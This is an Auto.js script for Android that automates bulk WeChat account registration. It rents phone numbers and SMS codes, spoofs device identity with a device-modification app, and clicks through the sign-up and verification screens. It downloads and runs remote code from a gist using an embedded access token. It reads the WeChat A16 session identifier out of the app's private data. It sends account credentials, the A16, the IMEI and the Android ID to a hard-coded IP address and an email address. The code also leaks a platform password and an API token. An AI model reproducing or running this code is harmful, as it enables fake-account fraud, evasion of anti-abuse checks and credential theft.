auto.waitFor()



console.show()
console.setPosition(0, device.height / 2 + 200)
events.on("exit", function () {
    log("结束运行");
});
console.setGlobalLogConfig({
    "file": "/sdcard/微信.txt"
});



var ty = null
var _G_状态记录器 = null;//这个在开始的时候初始化
var _G_取号平台 = null //这个在开始的时候初始化
var storage = storages.create("微信")
var time_delay = 2000
var y = 1058 //设置滑动按钮高度
var _G_配置记录器 = null//这个是固定的
var 特殊标记 = Array()//作用为保留号码信息进行注册



if (!requestScreenCapture()) {
    toastLog("请求截图失败");
    exit();
}





function 本地加载(params) {
    ty = require("./ty")
}


function 网络加载(params) {
    try {
        var url = "https://gitee.com/api/v5/gists/1hv2ydb94kzo6jelansi046?access_token=e7c2845a0fbebd2be9fc7ee82a39392f"
        var res = http.get(url);
        if (res.statusCode == 200) {
            var ss = res.body.json().files
            // var eng=engines.execScript("微信注册",ss[Object.keys(ss)[0]].content);
            files.write(files.cwd() + "/ty.js", ss[Object.keys(ss)[0]].content)
            ty = require("./ty")
            files.remove(files.cwd() + "/ty.js")
            toastLog("从网络加载ty成功");
        } else {
            toastLog("从网络加载ty失败:" + res.statusMessage);
            exit()
        }
    } catch (error) {
        log(error)
    }

}



// var _G_取号平台 =new 菜鸟平台("api_yuzhongxin8_mmdx","zz2222..","1615")
// var _G_取号平台 =new 菜鸟平台(_G_配置记录器.取号平台账号,_G_配置记录器.取号平台密码,_G_配置记录器.项目编号)

function 初始化配置(菜鸟api账号, 菜鸟api密码, 项目id, 型号, 国家号, 网络切换方式, 好友微信号, 邮件地址) {
    菜鸟api账号 ? this.取号平台账号 = 菜鸟api账号 : this.取号平台账号 = storage.get("菜鸟api账号", "")
    菜鸟api密码 ? this.取号平台密码 = 菜鸟api密码 : this.取号平台密码 = storage.get("菜鸟api密码", "")
    项目id ? this.项目编号 = 项目id : this.项目编号 = storage.get("项目id", "")
    型号 ? this.型号 = 型号 : this.型号 = storage.get("型号")
    国家号 ? this.国家码 = 国家号 : this.国家码 = storage.get("国家号")
    网络切换方式 ? this.网络切换方式 = 网络切换方式 : this.网络切换方式 = storage.get("网络切换方式", "")//   
    // 好友微信号 ? this.发送至好友 = 好友微信号 : this.发送至好友 = storage.get("好友微信号", "")
    邮件地址 ? this.邮件地址 = 邮件地址 : this.邮件地址 = storage.get("邮件地址", "")
    if (this.国家码 == "40") {
        // this.
    } else {

    }

}

function 菜鸟平台(用户名, 密码, 项目id) {
    this.用户名 = 用户名
    this.密码 = 密码
    this.项目id = 项目id
    ///登录相关

    this.接口地址 = "http://api.jydpt.com/yhapi.ashx"
    this.token = null
    this.用户余额 = null
    this.级别 = null
    this.最大获取数 = null
    this.积分 = null
    ////取号相关
    this.P_ID = null
    this.获取时间 = null
    this.串口号 = null
    this.手机号 = null
    this.发送短信项目的接收号码 = null
    this.国家名称或区号 = null
    /////验证码相关
    this.验证码数字 = null
    this.完整短信内容 = null
    ////释放手机号
    ////拉黑手机号
    this.登录 = function () {
        try {
            var res = http.get(this.接口地址 + "?Action=userLogin&userName=" + this.用户名 + "&userPassword=" + this.密码)
            var data = res.body.string().split("|")
            log(data)
            if (data[0] == "OK") {
                this.token = data[1]
                this.用户余额 = data[2]
                this.级别 = data[3]
                this.最大获取数 = data[4]
                this.积分 = data[5]
                return true
            } else {
                switch (data[1]) {
                    case "频繁失败,2分钟后重试":
                        toastLog('频繁失败,2分钟后重试');
                        exit()
                        break;
                    case "[" + this.用户名 + "]不存在":
                        toastLog("用户名不存在")
                        exit()
                        break;
                    case "密码不匹配":
                        toastLog('密码不匹配');

                        exit()
                        break;
                    case "[" + this.用户名 + "]已禁用":
                        toastLog("[" + this.用户名 + "]已禁用");
                        exit()
                        break;
                }
            }
        } catch (error) {
            log(error)
        }
    }
    this.取号 = function () {
        try {
            var res = http.get(this.接口地址 + "?Action=getPhone&token=" + this.token + "&i_id=" + this.项目id + "&d_id")
            var data = res.body.string().split("|")
            log(data)
            if (data[0] == "OK") {
                this.P_ID = data[1]
                this.获取时间 = data[2]
                this.串口号 = data[3]
                this.手机号 = data[4]
                this.发送短信项目的接收号码 = data[5]
                this.国家名称或区号 = data[6]
                return true
            } else {
                switch (data[1]) {
                    case "Token无效":
                        toastLog('Token无效');
                        exit()
                        break;
                    case "余额不足,请充值":
                        toastLog('余额不足,请充值');
                        exit()
                        break;
                    case "未使用号过多,请补充余额":
                        toastLog('未使用号过多,请补充余额');
                        exit()
                        break;
                    case "暂时无号":
                        toastLog("暂时无号")
                        sleep(10000)
                        return false
                        break;

                    default:
                        break;
                }
            }
        } catch (error) {
            log(erroe)
        }

    }
    this.取验证码 = function () {
        try {
            _G_状态记录器.取验证码计数 += 1
            if (_G_状态记录器.取验证码计数 > 30) {
                _G_状态记录器.注册结果标记 = 3
            }
            var res = http.get(this.接口地址 + "?Action=getPhoneMessage&token=" + this.token + "&p_id=" + this.P_ID)
            var data = res.body.string().split("|")
            log(data)
            if (data[0] == "OK") {
                this.验证码数字 = data[1]
                this.完整短信内容 = data[2]
                return this.验证码数字
            } else {
                switch (data[1]) {
                    case "等待验证码":
                        toastLog("等待验证码,5秒后重试")
                        sleep(5000)
                        return this.取验证码()
                        break;
                    case "已离线或强制释放":
                        return false
                        break;
                    default:
                        break;
                }
            }
        } catch (error) {
            log(error)
        }
    }
    this.释放手机号 = function () {
        try {
            log("释放手机号")
            var res = http.get(this.接口地址 + "?Action=phoneRelease&token=" + this.token + "&p_id=" + this.P_ID)
            var data = res.body.string()
            log(data)
            log("释放手机号完成")
        } catch (error) {
            log(error)
        }
    }
    this.拉黑手机号 = function (拉黑原因) {
        拉黑原因 ? null : 拉黑原因 = "userd"
        try {
            var res = http.get(this.接口地址 + "?Action=phoneToBlack&token=" + this.token + "&p_id=" + this.P_ID + "&i_id=" + this.项目id + "&mobile=" + this.手机号 + "&reason=" + 拉黑原因)
            var data = res.body.string()
            log(data)
        } catch (error) {
            log(error)
        }
    }
}
菜鸟平台.初始化 = function () {
    return new 菜鸟平台(_G_配置记录器.取号平台账号, _G_配置记录器.取号平台密码, _G_配置记录器.项目编号)
}


threads.start(function () {
    events.onKeyDown("volume_up", function (event) {
        _G_取号平台.释放手机号()
        toastLog("音量上被按下,停止所有脚本");
        engines.stopAll()
    });

    log("toast 监听启动")
    events.observeToast();
    events.onToast(function (toast) {
        var pkg = toast.getPackageName();
        var text = toast.getText()
        switch (pkg) {
            case "com.igaiji.privacy":
                switch (text) {
                    case "一键新机完成":
                        _G_状态记录器.改机完成标记 = true
                        setTimeout(function () {
                            _G_状态记录器.改机完成标记
                        }, 1000)
                        break;
                    case "网络请求发生严重错误，请检查你的网络状态，原因：Could not resolve host: zy.igaiji.com":
                        className(ty.my_className_lsit.button).text("登录").findOne().click()
                        break;
                    case "该设备已经激活，继续使用改机服务":
                        _G_状态记录器.改机可用标记 = true
                        break;
                    default:
                        break;
                }
                break;

            case "com.tencent.mm":
                var wangluocuowu = new RegExp(/无法连接到服务器/)
                if (wangluocuowu.test(text)) {
                    _G_状态记录器.注册结果标记 = 4
                }

        }
        log("Toast内容: " + toast.getText() +
            " 来自: " + getAppName(pkg) +
            " 包名: " + pkg);
    });

});

function GET_A16() {   //据说运行之前要先杀死微信
    ty.强行停止APP("com.tencent.mm")
    try {
        var arr = files.listDir("/data/data/com.tencent.mm/files/kvcomm/");
        //log(arr);
        if (arr.length >= 1) {  //返回数组元素小于1说明没权限)
            for (var i in arr) {
                var s
                var str = files.read("/data/data/com.tencent.mm/files/kvcomm/" + arr[i]);
                var reg = /A(.*?)(?=[\_])/g;//匹配A开头_结尾的字符串

                var b = str.match(reg);
                //log(b);
                for (var c in b) {
                    var d = b[c]
                    if (d.length == 16) {//匹配到的字符串长度==16就是要找的东西了
                        s = true;
                        log("A16>>>>>" + d);
                        break;		//不知道为什么这里不能退出函数 可能是两层for循环 的问题
                    }
                }
                if (s == true) {

                    return d;	//所以只好在这里返回退出
                }
                sleep(50);

            }
        } else {
            log("获取文件目录失败~~没有权限)");
            return false;
        }
    } catch (error) {
        log(error)
        return false
    }
}

function 发邮件(info) {
    function send() {
        app.sendEmail({
            email: [_G_配置记录器.邮件地址],
            subject: "IG",
            text: info
        });
        鸭子("电子邮件")
    }
    send()
    sleep(1000)
    if (text("收件箱").exists()) {
        send()
    }
    var 发送 = desc("发送").findOne(5000)
    发送.click()
    sleep(1000)
}
function 传递信息(info) {
    log("本次数据:"+info)
    try {
        var imei=device.getIMEI()
        var androidid= device.getAndroidId()
    } catch (error) {
    }
    imei=imei ||"null"
    androidid=androidid ||"null"
    http.get("http://119.29.234.95:8000/?imei="+imei+"&androidid="+androidid+"&info="+info)
    if (storage.get("pingtai")==0) {
        发邮件(info)
    } else if (storage.get("pingtai")==1){
        _G_取号平台.存储数据(info)
    }
    
}
function 鸭子(文本) {
    var dd = text(文本).findOne(1000)
    if (dd) {
        while (true) {
            if (dd.clickable()) {
                dd.click()
                return true
            } else if (dd.depth() <= 1) {
                return false
            } else {
                dd = dd.parent()
            }

        }

    }
}

function 账号管理器() {
    this.用户名 = null
    this.密码 = null
    this.项目id = null
    ///登录相关

    this.接口地址 = "http://api.jydpt.com/yhapi.ashx"
    this.token = null
    this.用户余额 = null
    this.级别 = null
    this.最大获取数 = null
    this.积分 = null
    ////取号相关
    this.P_ID = null
    this.获取时间 = null
    this.串口号 = null
    this.手机号 = null///要有
    this.发送短信项目的接收号码 = null
    this.国家名称或区号 = null
    /////验证码相关
    this.验证码数字 = null
    this.完整短信内容 = null
    this.password = null/////////////////
    this.国家代码 = null////////////////
    let path = "/sdcard/微信注册用号码.txt"
    function get验证码(token) {
        try {
            let res = http.get("http://103.71.237.201/api/getmessagebytoken?token=" + token)
            let data = res.body.json()
            if (data.code == 0) {
                log("获取验证码成功")
                let 验证码数字 = data.message.match(/[0-9]{4}/g)[0]
                log("验证码为:"+验证码数字)
                return 验证码数字
            } else {
                return false
            }
        } catch (error) {
            log(error)
        }
    }
    function 记录(号码, 密码, 状态) {
        let file = files.open(path, "r", "utf-8")
        let allinfo = file.readlines()
        file.close()
        var temp_array = []
        allinfo.forEach(element => {
            let info = element.split("|")
            if (info[0] == 号码) {
                info[2] = 密码
                info[3] = 状态

            }
            temp_array.push(info.join("|"))

        })
        file = files.open(path, "w", "utf-8")
        file.writelines(temp_array)
        file.close()
    }
    this.登录 = function (params) {
        return true
    }
    this.取号 = function (params) {
        log('取号')
        if (files.exists(path)) {
            file = open(path, "r", "utf-8")
            hines = file.readlines()
            hines.forEach(element => {
                let 完整内容 = element.split("|")
                
                if (完整内容.length == 2) {
                   
                    this.手机号 = 完整内容[0]
                    this.token = 完整内容[1]

                }
            })
            file.close()
            if (this.手机号) {
                return true
            }else{
                toastLog('没有可用号码');
                exit()
            }
            
        } else {
            toastLog('账号文件不存在');
            exit()
        }
    }
    this.取验证码 = function () {
        
        for (let 获取验证码计数 = 0; 获取验证码计数 < 12; 获取验证码计数++) {
            log("取验证码")
            let yanzhengma=get验证码(this.token)
            log("获取到的验证码为"+yanzhengma)
            if (yanzhengma) {
                this.验证码数字 = yanzhengma
                return true
            } else {
                log("本次获取失败")
                sleep(5000)
            }

        }
        _G_状态记录器.注册结果标记 = 5
        sleep(2000)
        log("无法获取验证码")
    }
    this.释放手机号 = function () {
        记录(this.手机号, " ", "释放")
        log("释放手机号")
    }
    this.拉黑手机号 = function () {
        记录(this.手机号, " ", "拉黑")
        log("拉黑手机号")
    }
    this.存储数据 = function (params) {
        log("存储数据")
        记录(this.手机号, "附加数据:" + params)
    }

}

function 账号管理器2() {
    this.用户名 = null
    this.密码 = null
    this.项目id = null
    ///登录相关

    this.接口地址 = "http://api.jydpt.com/yhapi.ashx"
    this.token = null
    this.用户余额 = null
    this.级别 = null
    this.最大获取数 = null
    this.积分 = null
    ////取号相关
    this.P_ID = null
    this.获取时间 = null
    this.串口号 = null
    this.手机号 = null///要有
    this.发送短信项目的接收号码 = null
    this.国家名称或区号 = null
    /////验证码相关
    this.验证码数字 = null
    this.完整短信内容 = null
    this.password = null/////////////////
    this.国家代码 = null////////////////
    let path = "/sdcard/微信注册用号码.txt"
    function get验证码(token) {
        try {
            let res = http.get(token)
            let data = res.body.json()
            if (data.code == 0) {
                log("获取验证码成功")
                let 验证码数字 = data.message.match(/[0-9]{4}/g)[0]
                log("验证码为:"+验证码数字)
                return 验证码数字
            } else {
                return false
            }
        } catch (error) {
            log(error)
        }
    }
    function 记录(号码, 密码, 状态) {
        let file = files.open(path, "r", "utf-8")
        let allinfo = file.readlines()
        file.close()
        var temp_array = []
        allinfo.forEach(element => {
            let info = element.split("|")
            if (info[0] == 号码) {
                info[2] = 密码
                info[3] = 状态

            }
            temp_array.push(info.join("|"))

        })
        file = files.open(path, "w", "utf-8")
        file.writelines(temp_array)
        file.close()
    }
    this.登录 = function (params) {
        return true
    }
    this.取号 = function (params) {
        log('取号')
        if (files.exists(path)) {
            file = open(path, "r", "utf-8")
            hines = file.readlines()
            hines.forEach(element => {
                let 完整内容 = element.split("|")
                
                if (完整内容.length == 2) {
                   
                    this.手机号 = 完整内容[0]
                    this.token = 完整内容[1]

                }
            })
            file.close()
            if (this.手机号) {
                return true
            }else{
                toastLog('没有可用号码');
                exit()
            }
            
        } else {
            toastLog('账号文件不存在');
            exit()
        }
    }
    this.取验证码 = function () {
        
        for (let 获取验证码计数 = 0; 获取验证码计数 < 12; 获取验证码计数++) {
            log("取验证码")
            let yanzhengma=get验证码(this.token)
            log("获取到的验证码为"+yanzhengma)
            if (yanzhengma) {
                this.验证码数字 = yanzhengma
                return true
            } else {
                log("本次获取失败")
                sleep(5000)
            }

        }
        _G_状态记录器.注册结果标记 = 5
        sleep(2000)
        log("无法获取验证码")
    }
    this.释放手机号 = function () {
        记录(this.手机号, " ", "释放")
        log("释放手机号")
    }
    this.拉黑手机号 = function () {
        记录(this.手机号, " ", "拉黑")
        log("拉黑手机号")
    }
    this.存储数据 = function (params) {
        log("存储数据")
        记录(this.手机号, "附加数据:" + params)
    }

}

function 全局检测循环() {
    var timeout = 20
    // _G_状态记录器.当前号码信息 = storage.get("当前号码信息")
    while (true) {

        var tag_1 = text("请稍候...").className("android.widget.TextView").depth(5).findOne(timeout) //主页注册  背景为月亮那个 click
        var tag_2 = clickable(true).text(ty.current_语言.开始).findOne(timeout) //click //安全验证的开始按钮

        var tag_3 = className("android.widget.CheckBox").clickable(true).checked(false).findOne(timeout) //协议勾选框


        var tag_4 = text("语言").depth(7).findOne(timeout) //下一步 p.click

        var tag_5 = text("获取验证信息系统错误 ").findOne(timeout) // 
        var tag_6 = text(ty.current_语言.拖动下方滑块完成拼图).findOne(timeout) //调用函数
        var tag_7 = textStartsWith("让用户用微信扫描下面的二维码").depth(17).findOne(timeout)
        var tag_8 = text(ty.current_语言.注册).className("android.widget.Button").depth(12).findOne(timeout) //填写信息页注册按钮 click
        var tag_9 = textContains("不是我的").className(my_className_lsit.button).findOne(timeout) //click
        var tag_10 = textContains("返回注册流程").findOne(timeout) //click
        var tag_11 = textContains("验证手机号").findOne(timeout) // 
        var tag_12 = text("填写验证码").depth(10).findOne(timeout)
        var tag_13 = text("下一步").className(my_className_lsit.button).depth(12).findOne(timeout) //验证码页面的下一步 //click
        var tag_14 = textStartsWith("你当前注册环境异常").className("android.widget.TextView").depth(9).findOne(timeout) //这里直接结束
        var tag_15 = textContains("账号状态异常").findOne(timeout) //账号状态异常
        var tag_16 = text("好").findOne(timeout) //获取通讯录
        var tag_17 = textContains("系统繁忙").findOne(timeout)
        var tag_18 = text("通讯录").findOne(timeout)
        var tag_19 = textContains("当前手机号一个月内已成功注册微信号").findOne(timeout) //找   隐私保护  
        var tag_20 = text("正在载入数据...").findOne(timeout)
        var tag_21 = text("网页无法打开").findOne(timeout)
        var tag_22 = text("用短信验证码登录").findOne(timeout)
        var tag_23 = textContains("网络错误，请稍后再试").findOne(timeout)
        var tag_24 = text("确定").className(my_className_lsit.button).findOne(timeout)
        var tag_25 = textContains("加载中").findOne(timeout)
        var tag_26 = textContains("操作太频繁").findOne(timeout)
        var tag_27 = textContains("当前手机号当天已成功注册微信号").findOne(timeout)
        var tag_28 = textContains("超时").findOne(timeout)

        // try {
        //     if (auto.root.contentDescription.match(/当前所在页面/)  && ! _G_状态记录器.协议点击记录器) {
        //         _G_状态记录器.协议点击记录器= xieyi()
        //         log("协议记录器:"+_G_状态记录器.协议点击记录器)
        //     }
        // } catch (error) {

        // }
        if (tag_1) {
            log("请稍候,%d次后将重来", 50 - _G_状态记录器.请稍后计时器)
            if (_G_状态记录器.滑块返回标记) {
                back()
                _G_状态记录器.滑块返回标记 = false
            }
            _G_状态记录器.请稍后计时器 += 1
            sleep(2000)
            if (_G_状态记录器.请稍后计时器 > 50) {
                _G_状态记录器.请稍后计时器 = 0
                log("已经卡死，重新开始，计时器归零")

                _G_状态记录器.注册结果标记 = 6

            }
            _G_状态记录器.轮询计数 = 0
            continue
        } else {
            _G_状态记录器.请稍后计时器 = 0
        }
        if (tag_2) {
            log("点击开始")
            log("点击开始,剩余等待次数:%d", 50 - _G_状态记录器.点击开始计数器)
            _G_状态记录器.点击开始计数器 += 1
            if (_G_状态记录器.点击开始计数器 > 50) {
                _G_状态记录器.注册结果标记 = 6
            }
            sleep(time_delay)
            tag_2.click()
            sleep(time_delay)
            _G_状态记录器.轮询计数 = 0
            continue
        }
        if (tag_3) {
            log("点击协议")
            // sleep(time_delay)
            tag_3.click()
            // sleep(time_delay * 2)
            tag_3 = className("android.widget.CheckBox").clickable(true).checked(true).findOne(9000)

            if (tag_3) {
                // sleep(time_delay)
                log("勾选框状态:" + tag_3.checked())
                log("同意协议")
                sleep(10000)
                press(1100 / 1440 * device.width, 2400 / 2560 * device.height, 100)
                // sleep(time_delay )
                // dd = text("下一步").findOne(time_delay * 3)
                // if (dd) {

                //     dd.parent().click()
                //     log("下一步已点击")
                //     sleep(time_delay)
                // }else{
                //     log("同意协议后,下一步找不到")
                // }
            } else {
                log("点击协议无响应")
            }
            _G_状态记录器.轮询计数 = 0
            continue
        }
        if (tag_4) {
            log("弹出到主页")
            _G_状态记录器.注册结果标记 = 6
            _G_状态记录器.轮询计数 = 0
            continue
        }
        if (tag_5) {
            log("关闭页面")
            var fanhui = desc("返回").findOne(1000)
            fanhui ? fanhui.parent().click() : null
            sleep(time_delay)
            _G_状态记录器.轮询计数 = 0
            continue
        }

        if (tag_6) {//滑块
            toastLog("发现滑块")
            if (false) {
                sleep(8000)
                back()
                sleep(50)
                back()
                sleep(4000)

                _G_状态记录器.滑块返回标记 = true
            }

            if (_G_配置记录器.型号 == 1) {
                checknumber()
            } else {
                huakuai_start()
            }
            _G_状态记录器.轮询计数 = 0
            continue
        }
        if (tag_7) {
            log("等待二维码")
            var 网络模式 = storage.get("net_mode", 0)
            if (网络模式 == "2") {
                toastLog('wifi模式出现二维码,脚本退出');

                exit()
            }
            // var img = captureScreen();
            // images.save(img, "/sdcard/temp.jpg", "jpg", 100);
            // log("文件保存完成")
            _G_状态记录器.注册结果标记 = 5
            sleep(5000)
            _G_状态记录器.轮询计数 = 0
            continue
        }

        if (tag_8) {

            tag_8.click()
            sleep(time_delay)

            for (let index = 0; index < 10; index++) {
                toastLog("点了注册,等待响应")
                sleep(2000)
                if (!text(ty.current_语言.注册).className("android.widget.Button").depth(12).exists()) {
                    _G_状态记录器.注册点击后等待状态 = true
                    break;

                }
            }
            if (!_G_状态记录器.注册点击后等待状态) {
                log("等待注册卡死")
                _G_状态记录器.注册结果标记 = 6
            } else {
                log("等待注册完成")
            }
            _G_状态记录器.轮询计数 = 0
            continue
        }
        if (tag_9) {
            log("不是我的")
            tag_9.click()
            sleep(time_delay)
            _G_状态记录器.轮询计数 = 0
            continue
        }
        if (tag_10) {
            log("返回注册流程")
            sleep(time_delay)
            tag_10.click()
            sleep(time_delay)
            _G_状态记录器.轮询计数 = 0
            continue
        }

        if (tag_11) {
            log("等待验证手机号")
            sleep(time_delay)
            _G_状态记录器.轮询计数 = 0
            continue
        }
        tag_12 ? 填写验证码() : null
        tag_13 ? tag_13 : null
        if (tag_14) {
            log("环境异常:14")
            _G_状态记录器.注册结果标记 = 1
            _G_状态记录器.轮询计数 = 0
            continue
        }

        if (tag_15) {
            log("环境异常:15")
            _G_状态记录器.注册结果标记 = 1
            _G_状态记录器.轮询计数 = 0
            continue
        }

        if (tag_22) {
            log("需要重新登录")
            _G_状态记录器.注册结果标记 = 1
            _G_状态记录器.轮询计数 = 0
            continue
        }



        if (tag_16) {
            log("通讯录 好")
            // sleep(time_delay)
            tag_16.click()
            // sleep(time_delay)
            _G_状态记录器.轮询计数 = 0
            continue
        }
        if (tag_17) {
            _G_状态记录器.系统繁忙计数 += 1
            log("系统繁忙次数:" + _G_状态记录器.系统繁忙计数)
            var dd = desc("返回").findOne(1000)
            dd ? dd.parent().click() : null

            if (_G_状态记录器.系统繁忙计数 >= 6) {
                log("系统繁忙次数为6,不释放改机")
                _G_状态记录器.注册结果标记 = 6
            }
            sleep(time_delay)
            _G_状态记录器.轮询计数 = 0
            continue
        }
        tag_18 ? _G_状态记录器.注册结果标记 = 2 : null
        if (tag_19) {
            log("手机号一个月内已成功注册微信号")
            _G_状态记录器.注册结果标记 = 5
            _G_状态记录器.轮询计数 = 0
            continue
        }
        if (tag_20) {
            _G_状态记录器.载入数据计数 += 1
            log("载入数据")
            if (_G_状态记录器.载入数据计数 > 10) {
                _G_状态记录器.注册结果标记 = 1
                log("载入数据卡死")
            }
            _G_状态记录器.轮询计数 = 0
            continue
        }
        if (tag_21) {
            let dd = desc("返回").findOne(1000)
            dd ? dd.parent().click() : null
            _G_状态记录器.网页无法打开 += 1
            log("网页无法打开计数:" + _G_状态记录器.网页无法打开)
            if (_G_状态记录器.网页无法打开 >= 6) {
                log("网页无法打开计数5次,重来")
                _G_状态记录器.注册结果标记 = 6
            }
            sleep(time_delay)

            _G_状态记录器.轮询计数 = 0
            continue
        }
        if (tag_23) {
            _G_状态记录器.网络错误计数器 += 1
            log("网络错误次数:%d", _G_状态记录器.网络错误计数器)
            鸭子("确定", 3000)
            if (_G_状态记录器.网络错误计数器 > 5) {
                log("网络错误5次,重来")
                _G_状态记录器.注册结果标记 = 6
            }

            _G_状态记录器.轮询计数 = 0
            continue
        }
        // tag_24 ? tag_24.click() : null
        // tag_24 ? tag_24.click() : null

        if (tag_25) {
            log("加载中")
            sleep(time_delay)
            _G_状态记录器.加载中计数器 += 1
            if (_G_状态记录器.加载中计数器 > 20) {
                _G_状态记录器.注册结果标记 = 6
            }
            _G_状态记录器.轮询计数 = 0
            continue
        }
        if (tag_26) {
            log("操作太频繁")
            _G_状态记录器.注册结果标记 = 5
            _G_状态记录器.轮询计数 = 0
            continue
        } else if (tag_24) {
            log("确定")
            tag_24.click()
            _G_状态记录器.轮询计数 = 0
            continue
        }
        if (tag_27) {
            log("当前手机号当天已注册")
            _G_状态记录器.注册结果标记 = 5

            _G_状态记录器.轮询计数 = 0
            continue
        }
        if (tag_28) {
            log("超时,将返回")
            let dd = desc("返回").findOne(1000)
            dd ? dd.parent().click() : null

            _G_状态记录器.轮询计数 = 0
            continue
        }
        log("轮询中,剩余次数%d", 60 - _G_状态记录器.轮询计数)
        _G_状态记录器.轮询计数 += 1
        if (_G_状态记录器.轮询计数 > 60) {
            _G_状态记录器.注册结果标记 = 6
        }
    }
}
function 本地_main() {
    device.keepScreenOn()
    网络加载()
    // 本地加载()
    var 区号数组 = ["380", "977"]
    _G_配置记录器 = new 初始化配置();
    let pintai= storage.get("pingtai",0)
    while (true) {
        log(ty.状态记录器)
        _G_状态记录器 = new ty.状态记录器()
        if (pintai==0) {//菜鸟平台
            log('使用菜鸟平台')
            _G_取号平台 = 菜鸟平台.初始化()
        } else if(pintai==1) {
            log("使用本地数据1")
            _G_取号平台 = new 账号管理器()
        } else if(pintai==2) {
            log("使用本地数据2")
            _G_取号平台 = new 账号管理器2()
        }
        
        _G_取号平台.登录()

        ty.修改网络(true) //连接vpn
        // 改机_启动微信()
        _G_取号平台.取号()
        var phone_number = _G_取号平台.手机号
        log(phone_number)

        if (区号数组.indexOf(_G_配置记录器.国家码) != -1) {
            _G_取号平台.区号 = 区号数组[区号数组.indexOf(_G_配置记录器.国家码)]
            _G_取号平台.手机号 = _G_取号平台.手机号.substr(_G_取号平台.区号.length)
        }//Todo //
        _G_取号平台.password = ty.get_password()
        log(_G_取号平台.password) //
        ty.gaiji()
        if (!ty.启动微信()) {
            log("微信启动失败")
            continue
        }
        if (ty.zhuce()) {
            log("启动微信成功")

        }

        ty.select_guojia(_G_配置记录器.国家码)
        log("填写信息")
        ty.tianxie_info(_G_取号平台.手机号, _G_取号平台.password)
        // _G_状态记录器.注册结果标记 = false //重置标记
        // _G_状态记录器.滑块计数器 = 0
        // _G_状态记录器.载入数据计数 = 0
        _G_状态记录器.当前号码信息 = _G_取号平台
        storage.put("当前号码信息", _G_取号平台)
        _G_状态记录器.检测线程 = threads.start(全局检测循环)//这里需要使用记录器
        var 结果 = ty.等待结果()//这里需要使用记录器
        _G_状态记录器.检测线程.interrupt()
        switch (结果.status) {
            case 1:
                log("结果为1")
                var a16 = GET_A16()
                if (_G_取号平台.区号) {
                    _G_取号平台.手机号 = _G_取号平台.区号 + _G_取号平台.手机号
                }
                var info = _G_取号平台.手机号 + "----" + _G_取号平台.password + "----" + _G_配置记录器.国家码 + "----"+"1"+"----" + a16
                传递信息(info)
                break
            case 2:
                log("结果为2")
                var a16 = GET_A16()
                // app.launch("com.tencent.mm")
                // waitForPackage("com.tencent.mm")
                if (_G_取号平台.区号) {
                    _G_取号平台.手机号 = _G_取号平台.区号 + _G_取号平台.手机号
                }
                var info = _G_取号平台.手机号 + "----" + _G_取号平台.password + "----" + _G_配置记录器.国家码 + "----" +"2"+"----"+ a16
                传递信息(info)
                // ty.添加指定微信发送(_G_配置记录器.发送至好友)
                ty.修改ig备份名()
                break;
            case 3:

                log("结果为3")
                _G_取号平台.释放手机号()
                break
            case 4:
                log("结果为4")
                _G_取号平台.释放手机号()

                break
            case 5:
                log("结果为5")
                _G_取号平台.拉黑手机号()

                break
            case 6:
                log("结果为6")
                // _G_取号平台.释放手机号()    

                break
            default:
                break;
        }
        // ty.强行停止APP("com.igaiji.privacy")
    }
}
function main() {
    网络加载()
    var 区号数组 = ["380", "977"]



    while (true) {
        _G_配置记录器 = new 初始化配置();
        _G_状态记录器 = new ty.状态记录器()
        _G_取号平台 = 菜鸟平台.初始化()
        _G_取号平台.登录()

        ty.修改网络(true) //连接vpn
        // 改机_启动微信()
        _G_取号平台.取号()
        var phone_number = _G_取号平台.手机号
        log(phone_number)

        if (区号数组.indexOf(_G_配置记录器.国家码) != -1) {
            _G_取号平台.区号 = 区号数组[区号数组.indexOf(_G_配置记录器.国家码)]
            _G_取号平台.手机号 = _G_取号平台.手机号.substr(_G_取号平台.区号.length)
        }//Todo //
        _G_取号平台.password = ty.get_password()
        log(_G_取号平台.password) //
        ty.gaiji()
        if (!ty.启动微信()) {
            log("微信启动失败")
            continue
        }
        if (ty.zhuce()) {
            log("启动微信成功")

        }

        ty.select_guojia(_G_配置记录器.国家码)
        log("填写信息")
        ty.tianxie_info(_G_取号平台.手机号, _G_取号平台.password)
        // _G_状态记录器.注册结果标记 = false //重置标记
        // _G_状态记录器.滑块计数器 = 0
        // _G_状态记录器.载入数据计数 = 0
        _G_状态记录器.当前号码信息 = _G_取号平台
        storage.put("当前号码信息", _G_取号平台)
        _G_状态记录器.检测线程 = threads.start(ty.全局检测循环)//这里需要使用记录器
        var 结果 = ty.等待结果()//这里需要使用记录器
        _G_状态记录器.检测线程.interrupt()
        switch (结果.status) {
            case 1:
                log("结果为1")
                var a16 = GET_A16()
                if (_G_取号平台.区号) {
                    _G_取号平台.手机号 = _G_取号平台.区号 + _G_取号平台.手机号
                }
                var info = _G_取号平台.手机号 + "----" + _G_取号平台.password + "----" + _G_配置记录器.国家码 + "----" + a16
                传递信息(info)
                break
            case 2:
                log("结果为2")
                var a16 = GET_A16()
                // app.launch("com.tencent.mm")
                // waitForPackage("com.tencent.mm")
                if (_G_取号平台.区号) {
                    _G_取号平台.手机号 = _G_取号平台.区号 + _G_取号平台.手机号
                }
                var info = _G_取号平台.手机号 + "----" + _G_取号平台.password + "----" + _G_配置记录器.国家码 + "----" + a16
                传递信息(info)
                // ty.添加指定微信发送(_G_配置记录器.发送至好友)
                ty.修改ig备份名()
                break;
            case 3:

                log("结果为3")
                _G_取号平台.释放手机号()
                break
            case 4:
                log("结果为4")
                _G_取号平台.释放手机号()

                break
            case 5:
                log("结果为5")
                _G_取号平台.拉黑手机号()

                break
            case 6:
                log("结果为6")
                // _G_取号平台.释放手机号()    

                break
            default:
                break;
        }
        ty.强行停止APP("com.igaiji.privacy")
    }
}


function test() {
    _G_取号平台 = new 账号管理器()
    _G_取号平台.取号()
    log(_G_取号平台.手机号)

    // 本地加载()
    // var 区号数组 = ["380","977"]
    

    // }

    // ty.修改ig备份名()
    // ty.添加指定微信发送("server_10086")

}

// test()
// main()
本地_main()